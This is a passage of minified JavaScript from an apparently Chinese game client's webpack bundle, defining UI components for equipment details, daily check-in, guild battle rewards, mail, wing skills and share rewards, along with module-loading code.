i&&(e+=a.GlobalConfig.ZhiZunEquipLevel[this.index][i].headTxt),e},e.prototype.updateComeFrom=function(){this.onBody=this.onBag=!1;var t=this.data&&(d.ItemUtil.isEquip(this.data.itemConfig)||d.ItemUtil.isMasterEquip(this.data.itemConfig));if(t){var e=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(0);if(this.isMasterEquip){var i=d.ItemUtil.getSubType(this.data.itemConfig);e.getMasterEquipByIndex(i)&&e.getMasterEquipByIndex(i).handle==this.data.handle&&(this.onBody=!0)}else{var n=b.CommonUtils.copyDataHandler(d.ItemUtil.getPosList(this.data.itemConfig)||[]);if(n.length)for(var o=0;o<n.length;o++){var i=n[o];e.equipsData[i].item.handle==this.itemHandle&&(this.onBody=!0)}else{var i=d.ItemUtil.getSubType(this.data.itemConfig);this.onBody=e.equipsData[i].item.handle==this.itemHandle}}}this.onBody||(this.onBag=void 0!=this.itemHandle&&!!h.BagCT.ins().getBagGoodsByHandle(h.BagCT.BAG_TYPE_EQUIP,this.itemHandle))},e.prototype.checkIsMasterEquip=function(){var t,e=this.data instanceof C.ItemData?this.data:void 0;if(void 0!=this.itemHandle&&void 0==e){if(e=h.BagCT.ins().getBagGoodsByHandle(this.type1,this.itemHandle),!e)for(var i=l.SubRoles.ins().subRolesLen,n=0;i>n;n++)for(var o=l.SubRoles.ins().getSubRoleByIndex(n),s=o.getEquipLen(),r=0;s>r;r++)if(o.getEquipByIndex(r).item.handle==this.itemHandle){e=o.getEquipByIndex(r).item;break}if(!e)for(var u=p.Shop.ins().shopData,i=u.getShopEquipDataLength(),c=null,n=0;i>n;n++)if(c=u.getShopEquipDataByIndex(n),null!=c&&this.itemHandle==c.item.handle){e=c.item;break}e||new Error("请检查handle是否传错！"),t=e.itemConfig}else t=a.GlobalConfig.ItemConfig[this.configID];this.isMasterEquip=d.ItemUtil.isMasterEquip(t)},e.prototype.updateWearBtn=function(){this.onBody?removeFromParent(this.eWearBtn):this.onBag&&!this.fromGuildW&&o.EquipCT.ins().checkEquipIsCanWear(this.configID,this.data)?this.eWearBtn.label=gettext("穿 戴"):removeFromParent(this.eWearBtn)},e.prototype.onClickOWearBtn=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,i,n,a,r,u,p,c,f;return __generator(this,function(g){switch(g.label){case 0:return(t=this.data)?(e=d.ItemUtil.getType(t.itemConfig),this.onBag?e==s.ItemType.TYPE_0||this.isMasterEquip?o.EquipCT.ins().checkEquipAndTips(t.itemConfig.id,t,!0)?this.isMasterEquip?(i=d.ItemUtil.getSubType(t.itemConfig),F.MasterEquipCT.ins().sendMasterEquipWear(0,t.handle,i),[3,3]):[3,1]:[2]:[3,4]:[3,6]):[2];case 1:for(i=d.ItemUtil.getSubType(t.itemConfig),n=b.CommonUtils.copyDataHandler(d.ItemUtil.getPosList(t.itemConfig)||[]),-1==n.indexOf(i)&&n.push(i),a=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(0),r=[],u=0;u<n.length;u++){if(p=a.getEquipByIndex(n[u]),!p.item||!p.item.configID){i=n[u];break}c=h.BagCT.ins().getEquipAttrs(p.item),f=p.item.point?p.item.point:d.ItemUtil.getAttrPower(c),r.push(f)}return r.length>1&&(i=n[r.indexOf(Math.min.apply(Math,r))]),[4,sendSync(Ts.WearEquip,{handle:t.handle,pos:i,roleId:0})];case 2:g.sent(),g.label=3;case 3:return win.close("EquipDetailedWin"),[3,5];case 4:g.label=5;case 5:return[3,7];case 6:this.onBody,g.label=7;case 7:return[2]}})})},e.prototype.updateLock=function(){this.elockBtn.label=this.data.lock?gettext("解 锁"):gettext("锁 定"),this.onBody||this.onBag||removeFromParent(this.elockBtn)},e.prototype.updateMove=function(){this.onBody||removeFromParent(this.eMoveBtn)},e.prototype.updateClear=function(){var t=this.data.itemConfig,e=this.data.quality?this.data.quality:d.ItemUtil.getQuality2(t)>=0?d.ItemUtil.getQuality2(t):0;d.ItemUtil.getType(t);(!this.onBody&&!this.onBag||!e||o.EquipCT.ins().isNoShow(t)||this.isMasterEquip)&&removeFromParent(this.eClearBtn)},e.prototype.updateDecompose=function(){var t=this;if(t.data instanceof C.ItemData){var e=a.GlobalConfig.ItemDescConfig[t.data.itemConfig.descIndex];(t.onBody||e.subType>7)&&removeFromParent(t.edecomposeBtn)}else removeFromParent(t.edecomposeBtn);var i=this.data.itemConfig;(!this.onBody&&!this.onBag||o.EquipCT.ins().isNoShow(i,!1))&&removeFromParent(this.edecomposeBtn)},e.prototype.updateCompose=function(){var t,e,i,n;d.ItemUtil.getType(null===(t=this.data)||void 0===t?void 0:t.itemConfig);if(a.GlobalConfig.SyntheticConfig[this.data.configID]||this.isMasterEquip||removeFromParent(this.eSynthesisBtn),(null===(e=this.eSynthesisBtn)||void 0===e?void 0:e.parent)&&this.eSynthesisBtn.eRp){var s=o.EquipCT.ins().checkUpTjItem(null===(i=this.data.itemConfig)||void 0===i?void 0:i.id);s||(s=o.EquipCT.ins().checkUpAnimalsItem(null===(n=this.data.itemConfig)||void 0===n?void 0:n.id)),this.eSynthesisBtn.eRp.visible=s}this.onBody||this.onBag||removeFromParent(this.eSynthesisBtn)},e.prototype.onClickLockBtn=function(){var t=this.onBag?-1:this.index;o.EquipCT.ins().sendEquipLock(this.data.handle,t)},e.prototype.updateItemLock=function(){this.itemIcon.setLock(this.data.lock),this.updateLock()},e.prototype.onClickMoveBtn=function(){var t;if(this.isMasterEquip){var e=d.ItemUtil.getSubType(null===(t=this.data)||void 0===t?void 0:t.itemConfig);F.MasterEquipCT.ins().sendMasterEquipOff(this.curRole,e)}else o.EquipCT.ins().sendeMoveEquip(this.index);win.close("EquipDetailedWin")},e.prototype.onComposeBtn=function(){return win.close("EquipDetailedWin"),this.isMasterEquip?void win.open(O.MasterEquipWin,this.data.configID):void win.open("ComposeTip",this.data.configID)},e.prototype.onDecomposeBtn=function(){win.close("EquipDetailedWin");var t=this.data;if(t.lock)return void u.TipsCT.ins().showTips(gettext("当前装备已锁定，无法回收"));if(this.isMasterEquip)return void win.open(N.MasterEquipWarnFrameWin,t);for(var e=[t],i=!1,n=[],o=0;o<e.length;o++){var s=e[o];h.BagCT.ins().isNotRecycleXiLianEquip()&&s.isXiLian()?i=!0:n.push(s)}var a=h.BagCT.ins().getShowList(n);if(a&&a.length>0){var r=new P.BagCallBackConfirmData(this,this.callBackFunc,n,a,1);win.open("BagCallBackConfirmWin",r)}else n.length>0?h.BagCT.ins().sendCbequip(1,n):i&&u.TipsCT.ins().showTips(gettext("在设置界面勾选了不允许回收存有洗练石的装备，请先取消勾选"))},e.prototype.callBackFunc=function(t,e){if(t==R.BagCBConfirmResult.Confirm&&e.items){var i=5==e.group?1:e.group;h.BagCT.ins().sendCbequip(i,e.items)}},e.prototype.onClickClearBtn=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){return t=0,this.onBody?t=0:this.onBag&&(t=1),o.EquipCT.ins().clearTab=t,o.EquipCT.ins().clearEquipUid=this.data.handle,win.open("ReformWin"),win.close("EquipDetailedWin"),[2]})})},e.prototype.onClickInlayBtn=function(){win.open2("BagWin",A.BagWin.getShowPanelNames().indexOf(k.BagWin2),k.BagWin2.getShowPanelNames().indexOf(B.EquipInlayPanel)),win.close("EquipDetailedWin")},e.prototype.updateGemGroup=function(){var t=this.data,e=d.ItemUtil.getSubType(t.itemConfig),i=a.GlobalConfig.GemBaseConfig.equips.indexOf(e),n=!1;if(!this.roleModel||this.isMasterEquip)return void g.DisplayUtils.removeFromParent(this.eGemGrp);if(this.roleModel&&this.roleModel!=l.SubRoles.ins().getSubRoleByIndex(0)||(n=!0),!t||-1==i||n&&this.onBag||n&&!E.OpenSystem.ins().checkSysOpen(G.SystemType.GemSet)||void 0==t.handle)return void g.DisplayUtils.removeFromParent(this.eGemGrp);if(n){s=t.subType2;var o=x.EquipInlayCT.ins().getPosGemDatas(s)||[];this.listGemArr.replaceAll(o),r=x.EquipInlayCT.ins().getSuitDataById(s),h=r.isHasSuit(),h&&x.EquipInlayCT.ins().getGemDatas(s).length>=3?(this.lbActProgress.text="("+(x.EquipInlayCT.ins().getGemDatas(s).length||0)+"/3)",this.lbSkillName.text=r.suitSkillName+" lv"+r.suitLv,this.skillIcon0.source=r.suitIcon,this.lbSkillDes.textFlow=v.TextFlowMaker.generateTextFlow(r.suitDes)):g.DisplayUtils.removeFromParent(this.grp_TaoZhuang)}else{var s=d.ItemUtil.getSubType(t.itemConfig),r=new D.EquipInlaySuitData(s);r.roleData=this.roleModel;var o=this.getPosGemDatas(s)||[];this.listGemArr.replaceAll(o);var h=r.isHasSuit();h&&this.getGemDatas(s).length>=3?(this.lbActProgress.text="("+(this.getGemDatas(s).length||0)+"/3)",this.lbSkillName.text=r.suitSkillName+" lv"+r.suitLv,this.skillIcon0.source=r.suitIcon,this.lbSkillDes.textFlow=v.TextFlowMaker.generateTextFlow(r.suitDes)):g.DisplayUtils.removeFromParent(this.grp_TaoZhuang)}},e.prototype.updateExtremeGroup=function(){var t="#43F476",e="#75736F",i=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(0),n=this.index,o=M.ExtremeEquipCC.getZhiZunLv(n,i);if(0==o||!this.onBody||!i.isMy||this.isMasterEquip)return g.DisplayUtils.removeFromParent(this.extremGroup1),g.DisplayUtils.removeFromParent(this.skillGrp0),g.DisplayUtils.removeFromParent(this.skillGrp),void g.DisplayUtils.removeFromParent(this.extremGroup2);var s=M.ExtremeEquipCC.getZhiZunLinkLv(i,n,o),h=M.ExtremeEquipCC.getLinkEquipPos(n),u=a.GlobalConfig.ZhiZunLinkLevel[n][h][0==s?1:s];this.quali.source="tips_"+this.data.quality;var p=a.GlobalConfig.ZhiZunEquipLevel[n][0==o?1:o];if(this.value0.textFlow=(new egret.HtmlTextParser).parse(y.AttributeData.getAttrShowStr(M.ExtremeEquipCC.setBasicsDesc(n),":")),p.skillId){var c=a.GlobalConfig.SkillsConfig[p.skillId],f=a.GlobalConfig.SkillsConfig[p.skillId].desc,C=a.GlobalConfig.SkillsDescConfig[f];this.skillname0.text=C.name+(o>0?"Lv"+o:gettext("Lv1(未激活)"));var T=I.SkillUtil.getDesc(c);this.skilldesc0.textFlow=v.TextFlowMaker.generateTextFlow(T)}else g.DisplayUtils.removeFromParent(this.skillGrp0);var b=m.Role.getEquipNameByType(u.firstSlot)+"",_=m.Role.getEquipNameByType(u.secondSlot)+"",S=M.ExtremeEquipCC.getZhiZunLvByRoleID(i,u.firstSlot)>0?t:e,x=M.ExtremeEquipCC.getZhiZunLvByRoleID(i,u.secondSlot)>0?t:e;this.itemLab0.textFlow=v.TextFlowMaker.generateTextFlow("<font color="+S+">"+b+"</font><font color="+x+">/"+_+"</font> ");var D=u.name,A=M.ExtremeEquipCC.getZhiZunLv(u.firstSlot),k=M.ExtremeEquipCC.getZhiZunLv(u.secondSlot),B=A>0&&k>0?gettext("(已激活)"):gettext("(未激活)");this.skillname.textFlow=v.TextFlowMaker.generateTextFlow("<font>"+D+B+"</font>"),this.skilldesc.textFlow=v.TextFlowMaker.generateTextFlow(u.chainDesc),this.hasLab0.textFlow=v.TextFlowMaker.generateTextFlow('<font color="'+(A>0&&k>0?t:e)+'">'+((A>0?1:0)+(k>0?1:0)+"/2")+"</font>");for(var P=[],R=M.ExtremeEquipCC.positions,E=0,G=[],L=0;L<R.length;L++){var F=M.ExtremeEquipCC.getZhiZunLvByRoleID(i,R[L]);P.push(F>0?t:e),F>0&&E++;var O=d.ItemUtil.getPosName(L);G.push(O)}this.itemLab.textFlow=v.TextFlowMaker.generateTextFlow("<font color="+P[0]+">"+G[0]+"</font>     <font color="+P[1]+">"+G[1]+"</font>      <font color="+P[2]+">"+G[2]+"</font>      <font color="+P[3]+">"+G[3]+"</font>     <font color="+P[4]+">"+G[4]+"</font>\n<font color="+P[5]+">"+G[5]+"</font>     <font color="+P[6]+">"+G[6]+"</font>      <font color="+P[7]+">"+G[7]+"</font>      <font color="+P[8]+">"+G[8]+"</font>     <font color="+P[9]+">"+G[9]+"</font>"),this.hasLab.textFlow=v.TextFlowMaker.generateTextFlow("<font color="+(E>=10?t:e)+">"+(E+"/10")+"</font>");var N=w.QUALITY_COLOR[1];this.skillname1.textFlow=v.TextFlowMaker.generateTextFlow1("|C:"+N+"&T:【"+a.GlobalConfig.ZhiZunSuitSkillConf.skillName+"】");var W=a.GlobalConfig.SkillsConfig[a.GlobalConfig.ZhiZunSuitSkillConf.skillId[r.ActorCC.jobId-1]],U=E>=10?4453494:7697263;this.value2.textFlow=v.TextFlowMaker.generateTextFlow(I.SkillUtil.getDesc(W)),this.value2.textColor=U},e.prototype.updateSacrificeGroup=function(){if(this.index>9||this.isMasterEquip)return void g.DisplayUtils.removeFromParent(this.eSacrificeGrp);var t=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(0),e=t.sacrificeArr,i=this.checkSacrificeValue(e[this.index]);if(!(e&&e.length&&this.onBody&&i))return void g.DisplayUtils.removeFromParent(this.eSacrificeGrp);var n=e[this.index],s=a.GlobalConfig.EquipSlotAffixBaseConfig[this.index][t.job][n.lv],r=o.EquipCT.ins().getAttData(s.attrLst,n.attArr),h=y.AttributeData.getAttrBySacrifice(r),u=v.TextFlowMaker.generateTextFlow(h);this.eSacrificeAttr.textFlow=u},e.prototype.checkSacrificeValue=function(t){var e=t.attArr;for(var i in e)if(0!=e[i].attValue)return!0;return!1},e.prototype.getPosGemDatas=function(t){var e=this.roleModel,i=e.getEquipByIndex(t);return(null===i||void 0===i?void 0:i.gemDatas.concat())||[]},e.prototype.getGemDatas=function(t){for(var e=this.roleModel,i=e.getEquipByIndex(t),n=(null===i||void 0===i?void 0:i.gemDatas)||[],o=[],s=0;s<n.length;s++){var a=n[s];a.itemData&&0!=a.itemData.handle&&o.push(a)}return o},e.rankRole=function(){return e._rankRole},e.prototype.updateMasterGroup=function(){var t=this.data;return this.isMasterEquip&&t&&t.handle&&t.masterEntryArr.length?void(this.masterEntryList.dataProvider=new eui.ArrayCollection(t.masterEntryArr)):void g.DisplayUtils.removeFromParent(this.masterEntryGrp)},e}(n.BaseView);e.EquipDetailedItem=H,window.EquipDetailedItem=H,__reflect(H.prototype,"EquipDetailedItem",[]),window.EquipDetailedItem=H},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipTipsMasterEntryItem=void 0;var n=i(5),o=i(3),s=i(0),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){if(this.data){var t=s.GlobalConfig.MasterSuitEquipEntryConfig[this.data];if(t){this.skillIcon.source=t.icon+"_png";var e=t.name+"\n"+t.desc;this.eSkillDesc.textFlow=n.TextFlowMaker.generateTextFlow1(e)}}},e}(o.BaseItemRender);e.EquipTipsMasterEntryItem=a,window.EquipTipsMasterEntryItem=a,__reflect(a.prototype,"EquipTipsMasterEntryItem",[]),window.EquipTipsMasterEntryItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ButtonListItem=void 0;var n=i(3),o=i(24),s=i(273),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.selectId=-1,e.sRp=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.ButtonItem,this.eList.selectedIndex=this.selectId,this.eGp1.touchEnabled=this.eGp2.touchEnabled=!1,this.eGp2.touchChildren=!1,this.listSelect(this.selectId)},e.prototype.dataChanged=function(){var e,i,n,s,a;if(t.prototype.dataChanged.call(this),this.data){this.eList.dataProvider=new eui.ArrayCollection(o.CommonUtils.objectToArray(this.data)),this.sRp=!1;for(var r in this.data)this.data[r].sRp&&(this.sRp=!0);this.labelDisplay.text=(null===(n=null===(i=null===(e=this.data)||void 0===e?void 0:e[1])||void 0===i?void 0:i[1])||void 0===n?void 0:n.name1)||(null===(a=null===(s=this.data)||void 0===s?void 0:s[1])||void 0===a?void 0:a.name1)||""}},e.prototype.listSelect=function(t){this.selectId=t,this.eList&&(this.eList.selectedIndex=t)},e}(n.BaseItemRender);e.ButtonListItem=a,window.ButtonListItem=a,__reflect(a.prototype,"ButtonListItem",[]),window.ButtonListItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DailyCheckInCard=void 0;var n=i(21),o=i(198),s=i(16),a=i(594),r=i(3),l=function(t){function e(){var e=t.call(this)||this;return e.id=0,e.checkInState=0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){this.resetView();var t=this.data;if(t){this.dayFlagGroup.visible=!1,this.item.data=t.rewards[0];var e=o.DailyCheckIn.ins().getCheckInState(t.day);if(e)switch(e){case o.DailyCheckInState.canCheck:this.checkInState=o.DailyCheckInState.canCheck,this.showFlag();break;case o.DailyCheckInState.hasChecked:this.checkInState=o.DailyCheckInState.hasChecked,this.showChecked()}else{this.showFlag();var i=!1;this.item.touchChildren=!i,this.item.touchEnabled=!i}}this.showEquipEffect()},e.prototype.showEquipEffect=function(){var t=o.DailyCheckIn.ins().getCheckInState(this.data.day);t!=o.DailyCheckInState.canCheck?this.EquipEffect&&s.DisplayUtils.removeFromParent(this.EquipEffect):(this.EquipEffect=this.EquipEffect||new n.MovieClip,this.EquipEffect.parent||this.eG.addChild(this.EquipEffect),this.EquipEffect.playFile(RES_DIR_EFF+"ValueEff2",-1))},e.prototype.showChecked=function(){this.checked.visible=this.checkedMask.visible=!0},e.prototype.showFlag=function(){var t=this.data;if(t)if(t.vipLabel>0){var e=t.vipLabel;e>10&&(e=10);var i=a.CheckInConfigMgr.ins().getVipCfg_Daily(e);i&&(this.vipFlagGroup.visible=!0,this.vipLab.text=gettext("V{0}双倍",e))}else t.dayLabel>0&&(this.dayLab.text=gettext("{0}天",t.day))},e.prototype.resetView=function(){this.vipFlagGroup.visible=!1,this.dayFlagGroup.visible=!1,this.checked.visible=this.checkedMask.visible=!1,this.EquipEffect&&s.DisplayUtils.removeFromParent(this.EquipEffect)},e}(r.BaseItemRender);e.DailyCheckInCard=l,window.DailyCheckInCard=l,__reflect(l.prototype,"DailyCheckInCard",[]),window.DailyCheckInCard=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CheckInConfigMgr=void 0;var n=i(50),o=i(0),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getMonthRewardCfg_Daily=function(){if(!this.monthListConfig||this.monthListConfig.length<=0){this.monthListConfig=[];var t=o.GlobalConfig.MonthSignConfig;for(var e in t)this.monthListConfig.push(t[e])}return this.monthListConfig},e.prototype.getSingleRewardCfg_Daily=function(t){var e=this.getMonthRewardCfg_Daily();if(e){var i=e[t-1];return i}return null},e.prototype.getVipCfg_Daily=function(t){var e=o.GlobalConfig.MonthSignVipConfig[t];return e},e}(n.BaseClass);e.CheckInConfigMgr=s,window.CheckInConfigMgr=s,__reflect(s.prototype,"CheckInConfigMgr",[]),window.CheckInConfigMgr=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem1=void 0;var n=i(3),o=i(2),s=i(51),a=i(328),r=i(596),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem1Skin",e._leftCnt=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this._playerArr=new eui.ArrayCollection,this.listPlayer.itemRenderer=r.GuildBattleItem2,this.listPlayer.dataProvider=this._playerArr,this.addTouchEvent(this.btnAlloc,this.onClick),this.dataChanged()},e.prototype.onClick=function(t){return this._leftCnt<=0?void o.TipsCT.ins().showTips(gettext("没有可分配的奖励了！")):void win.open(a.GuildBattleRewardAllocateWin,{cnt:this._cnt,maxCnt:this._maxCnt,rewardId:this._rewardId})},e.prototype.dataChanged=function(){var t,e,i;if(this.skin&&this.data){var n=this.data;this._rewardId=n.id,this.item.data=n.awardShow[0];var o=0,a=[];if((null===(t=s.GuildBattleCT.ins().getModel())||void 0===t?void 0:t.allotInfoList[n.rank])&&(null===(e=s.GuildBattleCT.ins().getModel())||void 0===e?void 0:e.allotInfoList[n.rank][n.id])&&(a=null===(i=s.GuildBattleCT.ins().getModel())||void 0===i?void 0:i.allotInfoList[n.rank][n.id],a&&a.length>0))for(var r=0,l=a;r<l.length;r++){var h=l[r];o+=h.cnt}this._playerArr.source=a,this._cnt=o,this.txtFlag.visible=0==o;var u=n.count;this._maxCnt=u,this._leftCnt=u-o,this.txtCnt.text=this._leftCnt+"/"+u}},e}(n.BaseItemRender);e.GuildBattleItem1=l,window.GuildBattleItem1=l,__reflect(l.prototype,"GuildBattleItem1",[]),window.GuildBattleItem1=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem2=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem2Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;this.txtCnt.text=gettext(t.cnt+"份"),this.txtName.text=gettext(t.name),this.imgJob.source="zjmhead_json.yuanhead"+t.job+"1"}},e}(n.BaseItemRender);e.GuildBattleItem2=o,window.GuildBattleItem2=o,__reflect(o.prototype,"GuildBattleItem2",[]),window.GuildBattleItem2=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleLastwarItem=void 0;var n=i(3),o=i(4),s=i(28),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildBattleLastwarItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){var t;this._oldColor=(null===(t=this.txtScore)||void 0===t?void 0:t.textColor)||16767413,this.dataChanged()},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){this.itemIndex<3?(this.txtRank.visible=!1,this.imgRank.visible=!0,this.imgRank.source="paihang_d"+(this.itemIndex+1)):(this.txtRank.visible=!0,this.imgRank.visible=!1,this.txtRank.text=gettext("第{0}名",this.itemIndex+1)),this.txtGuildName.text=this._info.guildName,this.txtPlayerName.text=this._info.ownName,this.txtScore.text=this._info.guildPoint+"";var t=16777215;0==this._info.type?s.Guild.ins().guildID==this._info.id?(t=4587386,this.txtRank.textColor=this.txtGuildName.textColor=this.txtPlayerName.textColor=this.txtScore.textColor=t):this.txtRank.textColor=this.txtGuildName.textColor=this.txtPlayerName.textColor=this.txtScore.textColor=this._oldColor:o.ActorCC.actorID==this._info.id?(t=4587386,this.txtRank.textColor=this.txtGuildName.textColor=this.txtPlayerName.textColor=this.txtScore.textColor=t):this.txtRank.textColor=this.txtGuildName.textColor=this.txtPlayerName.textColor=this.txtScore.textColor=this._oldColor}},e}(n.BaseItemRender);e.GuildBattleLastwarItem=a,window.GuildBattleLastwarItem=a,__reflect(a.prototype,"GuildBattleLastwarItem",[]),window.GuildBattleLastwarItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleRewardItem=void 0;var n=i(3),o=i(11),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildBattleRewardItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listReward.itemRenderer=o.ItemBase,this._rewardArr=new eui.ArrayCollection,this.listReward.dataProvider=this._rewardArr,this.dataChanged()},e.prototype.dataChanged=function(){var t=this.data;this.skin&&t&&(t.rank<4?(this.imgRank.source="paihang_d"+t.rank,this.imgRank.visible=!0,this.txtRank.visible=!1):(this.imgRank.visible=!1,this.txtRank.visible=!0,this.txtRank.text=gettext("第{0}名",t.rank)),this._rewardArr.source=t.rewards)},e}(n.BaseItemRender);e.GuildBattleRewardItem=s,window.GuildBattleRewardItem=s,__reflect(s.prototype,"GuildBattleRewardItem",[]),window.GuildBattleRewardItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MailItem=void 0;var n=i(3),o=i(5),s=i(400),a=function(t){function e(){var e=t.call(this)||this;
return e._sn_="MailItemSkin",e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;if(t instanceof s.MailData){var e="|C:0xA89C88&T:"+t.title+"|";e=e+"|C:"+(t.type?"0X5b5b5b":"0xf3311e")+"&T:"+(t.type?gettext("(已读)"):gettext("(未读)"))+"|",this.eName.textFlow=o.TextFlowMaker.generateTextFlow(e),this.eGet.visible=0==t.receive,this.eIcon.source=t.type?"mail_read":"mail_notread"}}},e}(n.BaseItemRender);e.MailItem=a,window.MailItem=a,__reflect(a.prototype,"MailItem",[]),window.MailItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingAttrItemRender=void 0;var n=i(5),o=i(3),s=i(72),a=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e._sn_="WingAttrItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){s.AttributeFormat.getFormat();this.attrLabel.textFlow=n.TextFlowMaker.generateTextFlow(this.data.curAttr),this.data.nextAttr?(this.attrLabel.x=8,this.arrows.visible=!0,this.nextAttrLabel.textFlow=n.TextFlowMaker.generateTextFlow(this.data.nextAttr)):(this.attrLabel.x=220,this.arrows.visible=!1,this.nextAttrLabel.textFlow=[]),this.data.tempAttr?this.attrTempLabel.textFlow=n.TextFlowMaker.generateTextFlow("（+"+this.data.tempAttr+"）"):this.attrTempLabel.textFlow=[]}},e}(o.BaseItemRender);e.WingAttrItemRender=a,window.WingAttrItemRender=a,__reflect(a.prototype,"WingAttrItemRender",[]),window.WingAttrItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingPasSkillItem=void 0;var n=i(5),o=i(3),s=i(0),a=i(86),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WingPasSkillItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.red.visible=!1,observe(this,this.dataChanged,a.SkillCT.ins().updateSkillVule),observe(this,this.dataChanged,a.SkillCT.ins().postSkillUpgrade)},e.prototype.dataChanged=function(){var t=this.data.wingSkill;if(t){var e=t.skillId,i=s.GlobalConfig.SkillsConfig[e],o=s.GlobalConfig.SkillsDescConfig[i.desc];this.skillName.text=o.name||"",this.icon.source=e+"_png",this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow(o.desc||""),this.data.jihuo?this.notImg.source="Skill_yjh":this.notImg.source="Skill_wjh"+(t.wingLv+1)}},e.prototype.ClearObj=function(){this.skin&&delMsg(this)},e}(o.BaseItemRender);e.WingPasSkillItem=r,window.WingPasSkillItem=r,__reflect(r.prototype,"WingPasSkillItem",[]),window.WingPasSkillItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SevenDayLogItem=void 0;var n=i(3),o=i(9),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="act14item1",e}return __extends(e,t),e.prototype.removeDisplay=function(){egret.Tween.removeTweens(this.eff)},e.prototype.dataChanged=function(){if(this.data){var t=this.data;if(this.item.source=t.img,this.day.source="dengluday"+(t.day<10?0:"")+t.day,this.get.visible=!1,this.eff.alpha=0,egret.Tween.removeTweens(this.eff),o.Activity.ins().dayNum>=t.day)if(1==(o.Activity.ins().isAwards>>t.day&1))this.get.visible=!0;else{var e=egret.Tween.get(this.eff,{loop:!0});e.to({alpha:1},500).to({alpha:0},500)}this.rare.source=t.iconImg?t.iconImg:""}},e}(n.BaseItemRender);e.SevenDayLogItem=s,window.SevenDayLogItem=s,__reflect(s.prototype,"SevenDayLogItem",[]),window.SevenDayLogItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameItem1=void 0;var n=i(3),o=i(176),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eBtn,this.onTap)},e.prototype.onTap=function(){o.ShareCT.ins().sendGetTotal(this.data.id)},e.prototype.dataChanged=function(){var t,e=o.ShareCT.ins().totalShare,i=this.data,n=i.id,s=i.type,a=i.target,r=i.param,l=i.awardList,h=0,u=0,p=0;e&&e.length&&(t=e[n],h=t[0],u=t[1],p=t[2]),1==s?this.eTxt.text=gettext("通过分享进入的好友人数({0}/{1})",u,a):this.eTxt.text=gettext("进入游戏的好友达到{0}级({1}/{2})",r,u,a),p?this.eBtn.label=1==p?gettext("可领取"):gettext("已领取"):this.eBtn.label=gettext("未完成"),this.eBtn.enabled=1==p,this.eL.dataProvider=new eui.ArrayCollection(l)},e}(n.BaseItemRender);e.WxGameItem1=s,window.WxGameItem1=s,__reflect(s.prototype,"WxGameItem1",[]),window.WxGameItem1=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(605);window.pbModules=n,n.keys().forEach(function(t){return n(t)});var o=i(763);window.tModules=o,o.keys().forEach(function(t){return o(t)}),i(135);var s={};window.Win2Str=s;var a=i(765);window.iModules=a,a.keys().forEach(function(t){var e=t.split("/");window.pathArr=e;var i=e[e.length-1].split(".")[0];window.name=i,s[i]=a(t)[i]});var r=i(1389);window.cModules=r,r.keys().forEach(function(t){return r(t)});var l=i(1818);window.ccModules=l,l.keys().forEach(function(t){return l(t)})},function(t,e,i){function n(t){var e=o(t);return i(e)}function o(t){if(!i.o(s,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return s[t]}var 